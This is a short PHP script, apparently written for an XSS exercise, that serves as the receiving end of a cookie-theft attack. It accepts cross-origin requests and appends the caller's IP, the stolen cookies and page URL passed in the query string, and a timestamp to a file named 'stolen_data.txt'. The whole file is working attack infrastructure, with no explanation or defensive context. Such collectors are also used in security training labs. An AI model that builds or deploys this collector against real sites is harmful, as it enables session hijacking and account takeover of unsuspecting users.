<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: text/plain');

$logFile = 'stolen_data.txt';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

$data = "=== XSS EXERCICE ===\n";
$data .= "Timestamp: $timestamp\n";
$data .= "IP: $ip\n";
$data .= "Cookies: " . ($_GET['cookies'] ?? 'Aucun') . "\n";
$data .= "URL: " . ($_GET['url'] ?? 'Unknown') . "\n";
$data .= "===================\n\n";

file_put_contents($logFile, $data, FILE_APPEND | LOCK_EX);
echo "OK";
?>